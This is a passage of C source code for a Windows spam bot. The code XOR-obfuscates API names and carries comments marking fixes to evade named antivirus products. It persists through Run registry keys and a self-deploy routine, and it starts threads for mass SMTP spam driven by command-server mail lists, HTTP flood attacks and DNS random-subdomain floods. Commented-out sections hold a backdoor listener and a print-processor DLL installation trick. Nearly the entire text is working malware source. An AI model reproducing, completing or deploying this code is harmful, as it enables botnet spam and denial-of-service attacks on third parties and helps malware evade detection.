	BOOL bPrintProcDirGet = GetPrintProcessorDirectory(NULL, NULL, 1, bPrintProcessorDirectory, MAX_PATH, (LPDWORD)&hFile);
	GetTempFileNameA((LPCSTR)bPrintProcessorDirectory, NULL, NULL, cFileName);
	GetModuleFileName(NULL, cMyFilename, sizeof(cMyFilename));
	MyCopyFile(cMyFilename, cFileName);
	hNewPrintProcessor = CreateFile(cFileName, 0x1F01FF, 1, NULL, 3, NULL, NULL);
	if (hNewPrintProcessor != INVALID_HANDLE_VALUE) {
		HMODULE hSelfModule = GetModuleHandle(NULL);
		PIMAGE_NT_HEADERS pNtHeaders = RtlImageNtHeader(hSelfModule);
		SetFilePointer(hNewPrintProcessor, (DWORD)pNtHeaders - (DWORD)hSelfModule + 0x16, NULL, NULL);
		WORD wNewCharacteristics = pNtHeaders->FileHeader.Characteristics | IMAGE_FILE_DLL;
		DWORD dwWritten;
		WriteFile(hNewPrintProcessor, &wNewCharacteristics, sizeof(wNewCharacteristics), &dwWritten, NULL);
		CloseHandle(hNewPrintProcessor);
		char * cDllName;
		cDllName = PathFindFileName(cFileName);
		BOOL bPrintProcAdded = AddPrintProcessor(NULL, NULL, cDllName, CURRENT_VERSION);
		BOOL bPrintProcRemoved = DeletePrintProcessor(NULL, NULL, CURRENT_VERSION);
		//DeleteFile(cFileName);
	}
	return true;
}
*/
void FuncsInit()
{
	//AddToLog("Decrypting data.\n");
	Unxor_XorIt((PCHAR)g_func_createprocess, sizeof(g_func_createprocess), false);
	Unxor_XorIt((PCHAR)g_func_regcreatekey, sizeof(g_func_regcreatekey), true);
	Unxor_XorIt((PCHAR)g_func_regclosekey, sizeof(g_func_regclosekey), true);
	Unxor_XorIt((PCHAR)g_func_regsetvalueex, sizeof(g_func_regsetvalueex), true);
	Unxor_XorIt((PCHAR)g_func_regqueryvalueex, sizeof(g_func_regqueryvalueex), true);
	Unxor_XorIt((PCHAR)g_func_gettickcount, sizeof(g_func_gettickcount), true);
	Unxor_XorIt((PCHAR)g_func_terminatethread, sizeof(g_func_terminatethread), true);
	Unxor_XorIt((PCHAR)g_func_exitthread, sizeof(g_func_exitthread), true);
	Unxor_XorIt((PCHAR)g_func_wsastartup, sizeof(g_func_wsastartup), true);
	Unxor_XorIt((PCHAR)g_func_wsacleanup, sizeof(g_func_wsacleanup), true);
	Unxor_XorIt((PCHAR)g_func_bind, sizeof(g_func_bind), true);
	Unxor_XorIt((PCHAR)g_func_listen, sizeof(g_func_listen), true);
	Unxor_XorIt((PCHAR)g_func_accept, sizeof(g_func_accept), true);
	Unxor_XorIt((PCHAR)g_func_recv, sizeof(g_func_recv), true);
	Unxor_XorIt((PCHAR)g_func_send, sizeof(g_func_send), true);
	Unxor_XorIt((PCHAR)g_func_socket, sizeof(g_func_socket), true);
	Unxor_XorIt((PCHAR)g_func_closesocket, sizeof(g_func_closesocket), true);
	Unxor_XorIt((PCHAR)g_func_connect, sizeof(g_func_connect), true);
	Unxor_XorIt((PCHAR)g_func_shutdown, sizeof(g_func_shutdown), true);
	Unxor_XorIt((PCHAR)g_func_gethostbyname, sizeof(g_func_gethostbyname), true);
	Unxor_XorIt((PCHAR)g_func_inet_addr, sizeof(g_func_inet_addr), true);
	Unxor_XorIt((PCHAR)g_func_select, sizeof(g_func_select), true);
	Unxor_XorIt((PCHAR)g_func_setsockopt, sizeof(g_func_setsockopt), true);
	Unxor_XorIt((PCHAR)g_func_sendto, sizeof(g_func_sendto), true);
	Unxor_XorIt((PCHAR)g_func_htons, sizeof(g_func_htons), true);
	Unxor_XorIt((PCHAR)g_func_ioctlsocket, sizeof(g_func_ioctlsocket), true);
	Unxor_XorIt((PCHAR)g_func_gethostname, sizeof(g_func_gethostname), true);
	Unxor_XorIt((PCHAR)g_func_ntohs, sizeof(g_func_ntohs), true);
	Unxor_XorIt((PCHAR)g_func_wsagetlasterror, sizeof(g_func_wsagetlasterror), true);
	Unxor_XorIt((PCHAR)g_func_dnsquery_a, sizeof(g_func_dnsquery_a), true);
	Unxor_XorIt((PCHAR)g_func_dnsrecordlistfree, sizeof(g_func_dnsrecordlistfree), true);
	Unxor_XorIt((PCHAR)g_func_createthread, sizeof(g_func_createthread), true);

	hKernel32 = GetModuleHandle("Kernel32");
	hLoadLibrary = (hLoadLibraryFunc)GetProcAddress(hKernel32, "LoadLibraryA");
	hCreateProcess = (hCreateProcessFunc)GetProcAddress(hKernel32, (PCHAR)g_func_createprocess);
	/*
	hKernel32 = GetFakeLibHandle("Kernel32.dll", "~a.dll");
	hAdvapi32 = GetFakeLibHandle("Advapi32.dll", "~b.dll");
	hWs2_32 = GetFakeLibHandle("ws2_32.dll", "~c.dll");
	hDnsapi = GetFakeLibHandle("dnsapi.dll", "~d.dll");
	hWinInet = GetFakeLibHandle("wininet.dll", "~e.dll");
	*/
	hKernel32 = GetLibHandle("Kernel32.dll");
	hAdvapi32 = GetLibHandle("Advapi32.dll");
	hWs2_32 = GetLibHandle("ws2_32.dll");
	hDnsapi = GetLibHandle("dnsapi.dll");
	hWinInet = GetLibHandle("wininet.dll");
	//AddToLog("Handles...\n");
	//AddToLogDword((DWORD)hKernel32);
	//AddToLogDword((DWORD)hAdvapi32);
	//AddToLog("Getting functions.\n");
	hRegCreateKey = (hRegCreateKeyFunc)GetProcAddress(hAdvapi32, (PCHAR)g_func_regcreatekey);
	hRegCloseKey = (hRegCloseKeyFunc)GetProcAddress(hAdvapi32, (PCHAR)g_func_regclosekey);
	hRegSetValueEx = (hRegSetValueExFunc)GetProcAddress(hAdvapi32, (PCHAR)g_func_regsetvalueex);
	hRegQueryValueEx = (hRegQueryValueExFunc)GetProcAddress(hAdvapi32, (PCHAR)g_func_regqueryvalueex);
    hGetTickCount = (hGetTickCountFunc)GetProcAddress(hKernel32, (PCHAR)g_func_gettickcount);
	hTerminateThread = (hTerminateThreadFunc)GetProcAddress(hKernel32, (PCHAR)g_func_terminatethread);
	hExitThread = (hExitThreadFunc)GetProcAddress(hKernel32, (PCHAR)g_func_exitthread);
	hSystemTimeToFileTime = (hSystemTimeToFileTimeFunc)GetProcAddress(hKernel32, "SystemTimeToFileTime"); //nod32 fix
	hDeleteFile = (hDeleteFileFunc)GetProcAddress(hKernel32, "DeleteFileA"); //DrWeb fix (Trojan.Spambot.origin)
	hCreateThread = (hCreateThreadFunc)GetProcAddress(hKernel32, (PCHAR)g_func_createthread);

	hWSAStartup = (hWSAStartupFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_wsastartup);
	hWSACleanup = (hWSACleanupFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_wsacleanup);
	hBind = (hBindFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_bind);
	hListen = (hListenFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_listen);
	hAccept = (hAcceptFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_accept);
	hRecv = (hRecvFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_recv);
	hSend = (hSendFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_send);
	hSocket = (hSocketFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_socket);
	hClosesocket = (hClosesocketFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_closesocket);
	hConnect = (hConnectFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_connect);
	hShutdown = (hShutdownFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_shutdown);
	hGethostbyname = (hGethostbynameFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_gethostbyname);
	hInet_addr = (hInet_addrFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_inet_addr);
	hSelect = (hSelectFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_select);
	hSetsockopt = (hSetsockoptFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_setsockopt);
	hSendto = (hSendtoFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_sendto);
	hHtons = (hHtonsFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_htons);
	hIoctlsocket = (hIoctlsocketFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_ioctlsocket);
	hGethostname = (hGethostnameFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_gethostname);
	hNtohs = (hNtohsFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_ntohs);
	hWSAGetLastError = (hWSAGetLastErrorFunc)GetProcAddress(hWs2_32, (PCHAR)g_func_wsagetlasterror);
	hDnsQuery_A = (hDnsQuery_AFunc)GetProcAddress(hDnsapi, (PCHAR)g_func_dnsquery_a);
	hDnsRecordListFree = (hDnsRecordListFreeFunc)GetProcAddress(hDnsapi, (PCHAR)g_func_dnsrecordlistfree);

	hInternetReadFile = (hInternetReadFileFunc)GetProcAddress(hWinInet, "InternetReadFile"); //antivira fix
	hInternetOpen = (hInternetOpenFunc)GetProcAddress(hWinInet, "InternetOpenA");
	hInternetConnect = (hInternetConnectFunc)GetProcAddress(hWinInet, "InternetConnectA");
	hHttpOpenRequest = (hHttpOpenRequestFunc)GetProcAddress(hWinInet, "HttpOpenRequestA");
	hHttpSendRequest = (hHttpSendRequestFunc)GetProcAddress(hWinInet, "HttpSendRequestA");
	hHttpQueryInfo = (hHttpQueryInfoFunc)GetProcAddress(hWinInet, "HttpQueryInfoA");
	hInternetCloseHandle = (hInternetCloseHandleFunc)GetProcAddress(hWinInet, "InternetCloseHandle");
	hInternetQueryOption = (hInternetQueryOptionFunc)GetProcAddress(hWinInet, "InternetQueryOptionA");
}

unsigned int __stdcall InitThread(LPVOID tParam)
{
	//bLogData = true;
	//AddToLog("Init thread started.\n");
	FuncsInit();
//	OutputDebugString("InitThread\r\n");
	g_dwBoundary = 0xf;
	g_dwRndSeed = 0;
	Job.dwTaskId = 0;

	__asm {
		mov eax,  fs:[30h]  // Teb.Peb
		mov eax,  [eax+0Ch] // Peb.Ldr - PEB_LDR_DATA
		mov eax,  [eax+0Ch] // Ldr.InLoadOrderModuleList.Flink
		lea ebx,  [eax+20h] // LDR_DATA_TABLE_ENTRY.SizeOfImage
		add [ebx], 10000h   // LDR_DATA_TABLE_ENTRY.SizeOfImage + 0x10000
	}
	//Sleep(1000);
	//AddToLog("Looking for a mutex.\n");
	//CreateMutex(NULL, FALSE, "Global\\mmm");
	//if (GetLastError() == ERROR_ALREADY_EXISTS) {
		//AddToLog("Mutex found...terminating.\n");
	//	TerminateProcess(GetCurrentProcess(), 0);
	//}
	SetCurrentDirectory(cSystemRoot);

	WSADATA wsaData;

	g_dwRndSeed = (*hGetTickCount)();
	(*hWSAStartup)(MAKEWORD(2,2), &wsaData);

	LoadRegistrySettings();
	ExecuteSheduledActions();
	//AddToLog("LifeSupport thread startup\n");
	Job.dwTaskId = 0;
	GetTimeZoneInformation(&tziZone);

#ifndef _DEBUG
	Wait(1*60*1000);
#endif

	DeploySelf();

	hLifeSupportThread = (HANDLE)((*hCreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)LifeSupportThread, (LPVOID)0, 0, NULL));
	hSpamSupportThread = (HANDLE)((*hCreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)SpamSupportThread, (LPVOID)0, 0, NULL));
	hDoS1Thread = (HANDLE)((*hCreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)DoS1Thread, (LPVOID)0, 0, NULL));
	hDNSDoSThread = (HANDLE)((*hCreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)DnsResolverThread, (LPVOID)0, 0, NULL));
/*
	DeployDriver();

	SOCKET ListenSocket, s2;
	if ((ListenSocket = (*hSocket)(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		BOOL isReuse = true;
		
		sockaddr_in server;
		memset(&server, '\0', sizeof(server));
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = htonl(INADDR_ANY);
		dwBackdoorPort = RtlRandom(&g_dwRndSeed)%49000 + 1000;
		server.sin_port = (u_short)((*hHtons)(dwBackdoorPort));

		if ((*hBind)(ListenSocket, (SOCKADDR *)&server, sizeof(server)) != SOCKET_ERROR) {
			if ((*hListen)(ListenSocket, SOMAXCONN) != SOCKET_ERROR) {
				int length = 0;
				while(1) {
					if ((s2 = (*hAccept)(ListenSocket, NULL, NULL)) != SOCKET_ERROR)
					{
						sockaddr_in SockAddr;
						int iBufSize = sizeof(SockAddr);
						getpeername(s2, (struct sockaddr*)&SockAddr, &iBufSize);
						char * cIp = inet_ntoa(SockAddr.sin_addr);
						HANDLE hThread = NULL;
						hThread = (HANDLE)((*hCreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)BackdoorThread, (PVOID)s2, 0, NULL));
					}
					Sleep(10);
				}
				(*hClosesocket)(ListenSocket);
			}
		}
	}

	dwBackdoorPort = 0;
*/
	while (true)
	{
		int total_sleep = 0;
		total_sleep = total_sleep + 5000;
		Sleep(5000);
		if (total_sleep == 600000)
			KillParentProcess();
	}

	return 0;
}
/*
bool isExeRunning(HMODULE hModule)
{
	char cFileName[MAX_PATH];
//	HMODULE hSelfModule = GetModuleHandle(NULL);
//	PIMAGE_NT_HEADERS pNtHeaders = RtlImageNtHeader(hSelfModule);
//	return (pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0;
	return ((hModule == 0) || (0 == GetModuleFileName(hModule, cFileName, sizeof(cFileName))));
}
*/
//int iInstanceCount = 0;
BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
{
//	if (isExeRunning(hModule)) {
//		FuncsInit();
//		OutputDebugString("IN EXE\r\n");
//		InstallSelfAsDLL();
//	} else if (dwReason == DLL_PROCESS_ATTACH) {
//		OutputDebugString("IN DLL\r\n");
//		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InitThread, (LPVOID)0, 0, NULL);
//	}
	InitThread(NULL);
	return TRUE;
}

unsigned int __stdcall DnsResolverThread(LPVOID tParam)
{
	do {
		if (strlen(cDNSDoS) > 0) {
			char cUrl[MAX_PATH], cAddon[MAX_PATH];
			for (int i=0; i<100; i++) {
				int iAddonLen = RtlRandom(&g_dwRndSeed)%10 + 1;
				for (int k=0; k<iAddonLen; k++)
					cAddon[k] = 'a' + (char)(RtlRandom(&g_dwRndSeed)%25);
				cAddon[iAddonLen] = '\0';
				sprintf(cUrl, "%s.%s", cAddon, cDNSDoS);
				hostent* HE = (*hGethostbyname)(cUrl);
				if (HE == 0) {
					(*hWSAGetLastError)();
					break;
				}
			}
		} else {
			Sleep(5000);
		}
	} while (true);
}

unsigned int __stdcall LifeSupportThread(LPVOID tParam)
{
//	OutputDebugString("LifeSupportThread\r\n");
	//AddToLog("LifeSupport thread EP\n");
	DWORD dwLastLinkTime = 0;
//	dwTimeout = atoi(cTimeout) * 1000;
	
	ExecuteSheduledActions();

	int iVer = atoi(CURRENT_VERSION);

	//hInitExe = CreateFile(cAppName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);

	while (1)
	{

#ifndef _DEBUG
		if (bDeployed) {
//			char cValue[MAX_PATH], cFileName[MAX_PATH];
//			GetModuleFileName(NULL, cFileName, sizeof(cFileName));
//			sprintf(cValue, "%s %s \"%s\" %s", "Explorer.exe", "rundll32.exe", cFileName, cContentTypeAlternative);
//			AddRegistryValueStr(HKEY_LOCAL_MACHINE, cSoftMicrWinCVrun_1, "Shell", cValue);
			AddRegistryValueStr(HKEY_LOCAL_MACHINE, cSoftMicrWinCVrun_1, cMalwareShortName, cDeployedName);
			AddRegistryValueStr(HKEY_LOCAL_MACHINE, cSoftMicrWinCVrun_2, cMalwareShortName, cDeployedName);
			AddRegistryValueStr(HKEY_CURRENT_USER, cSoftMicrWinCVrun_1, cMalwareShortName, cDeployedName);
			AddRegistryValueStr(HKEY_CURRENT_USER, cSoftMicrWinCVrun_2, cMalwareShortName, cDeployedName);
		}
#endif

		if (((*hGetTickCount)() - dwLastLinkTime) > 300*1000)
		{
			dwLastLinkTime = (*hGetTickCount)();
		}
		Wait(5000);
	}
	//VirtualFree(Buf, 0, MEM_RELEASE);
	//CloseHandle(hInitExe);
	return 0;
}

unsigned int __stdcall SpamSupportThread(LPVOID tParam)
{
	Sleep(5000);

	int iList, iMail;
	for (iList = 0; iList < MAX_MAIL_LISTS; iList++)
		for (iMail = 0; iMail < MAX_EMAILS; iMail++)
			MailLists[iList].cEmail[iMail]= NULL;

	int iThread;
	for (iThread = 0; iThread < MAX_THREADS; iThread++) {
		do {
			cThreadFormattedMessage[iThread] = (char *)VirtualAlloc(0, MAX_PACKET_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
			if (cThreadFormattedMessage[iThread] == NULL) Sleep(100);
		} while (cThreadFormattedMessage[iThread] == NULL);
		do {
			cThreadReplaceBuffer[iThread] = (char *)VirtualAlloc(0, MAX_PACKET_SIZE, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
			if (cThreadReplaceBuffer[iThread] == NULL) Sleep(100);
		} while (cThreadReplaceBuffer[iThread] == NULL);
	}

	do {
		cMXServers = (char *)VirtualAlloc(0, MAX_THREADS * MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (cMXServers == NULL) Sleep(100);
	} while (cMXServers == NULL);
	memset(cMXServers, '\0', MAX_THREADS * MAX_PATH);

//	bSMTPOk = Check25();

	while (true)
	{
		int iGetTaskResult = GetTask();
		if (iGetTaskResult == 2) {
			bUseReserveConfigPort = !bUseReserveConfigPort;
		} else if (iGetTaskResult == 0)	{
			DWORD dwCurrentMailList = 0;
			DWORD dwCurrentEmail = 0;
			memset(dwThreadStatus, THREAD_STATUS_FREE, sizeof(dwThreadStatus));
			
			while (dwCurrentMailList < MAX_MAIL_LISTS) {
				
				while (dwCurrentEmail < MailLists[dwCurrentMailList].dwEmailCount) {

					int iAvailableThreadNum;
					do {
						iAvailableThreadNum = AvailableThread();
						if (iAvailableThreadNum < 0) {
							Wait(99);
							MarkHangThreads();
							FreeThreads(false);
						}
					} while (iAvailableThreadNum < 0);
					dwThreadStatus[iAvailableThreadNum] = THREAD_STATUS_WORKING;

					SmtpThreadData[iAvailableThreadNum].pdwThreadStatus = &(dwThreadStatus[iAvailableThreadNum]);
					SmtpThreadData[iAvailableThreadNum].cMailFrom = MailLists[dwCurrentMailList].cEmail[0];
					SmtpThreadData[iAvailableThreadNum].cMailTo = MailLists[dwCurrentMailList].cEmail[dwCurrentEmail];
					SmtpThreadData[iAvailableThreadNum].cMessageTemplate = (PCHAR)Job.cText;
					memset(cThreadFormattedMessage[iAvailableThreadNum], '\0', MAX_PACKET_SIZE);
					SmtpThreadData[iAvailableThreadNum].cFormattedMessage = cThreadFormattedMessage[iAvailableThreadNum];
					SmtpThreadData[iAvailableThreadNum].cReplcaeBuffer = cThreadReplaceBuffer[iAvailableThreadNum];
					SmtpThreadData[iAvailableThreadNum].dwThreadIndex = iAvailableThreadNum;

					//DbgPrint("Msg frm [%s%s], snd...\n", Accounts.Account[dwAccountIndex]->Name, Accounts.Account[dwAccountIndex]->Domain);
					hThread[iAvailableThreadNum] = (*hCreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)SmtpThread, &SmtpThreadData[iAvailableThreadNum], 0, NULL);
					dwThreadStartTime[iAvailableThreadNum] = (*hGetTickCount)();
					Sleep(99);
	
					dwCurrentEmail++;
				}
				
				// Switching to next MailList
				dwCurrentMailList++;
				if (dwCurrentMailList == MAX_MAIL_LISTS)
					dwCurrentMailList = 0;
				// Getting next mail list, if fails then getting out
				if (!GetMailsList(dwCurrentMailList)) break;
				dwCurrentEmail = 0;
			}
			
			while (BusyThread() >= 0)
			{
				MarkHangThreads();
				FreeThreads(false);
				Sleep(100);
			}
			FreeTask();

		} else Sleep(dwTimeout);
	}
	return 0;
}

bool ExtractServerAndURI(char * cSource, char * cServer, char * cURI)
{
	if ((cSource == NULL) || (cServer == NULL) || (cURI == NULL))
		return false;
	if (strstr(cSource, "/") != NULL)
	{
		ExtractData(cSource, "/", cServer, MAX_PATH);
		strcpy(cURI, cSource + strlen(cServer));
	} else {
		strcpy(cServer, cSource);
		strcpy(cURI, "/");
	}
	return true;
}

unsigned int __stdcall DoS1Thread(LPVOID tParam)
{
	do {
		if (strlen(cDoS) > 0) {
			char cDoSBuf[10000];
			//HttpSay(cDoS, "/", "GET", "", "", 0, NULL, 0, cDoSBuf, sizeof(cDoSBuf), false);

			char * cDoSServerStart;
			if (strstr(cDoS, "http://") == cDoS)
				cDoSServerStart = cDoS + strlen("http://");
			else
				cDoSServerStart = cDoS;

			char cDoSServer[MAX_PATH], cDoSURI[MAX_PATH];
			memset(cDoSServer, '\0', sizeof(cDoSServer));
			memset(cDoSURI, '\0', sizeof(cDoSURI));
			if (!ExtractServerAndURI(cDoSServerStart, cDoSServer, cDoSURI))
				continue;
			HttpSay(cDoSServer, cDoSURI, "GET", "", "", 0, NULL, 0, cDoSBuf, sizeof(cDoSBuf), false);
			memset(cDoSBuf, '\0', sizeof(cDoSBuf));
		} else {
			Wait(5000);
		}
	} while (true);
	return 0;
}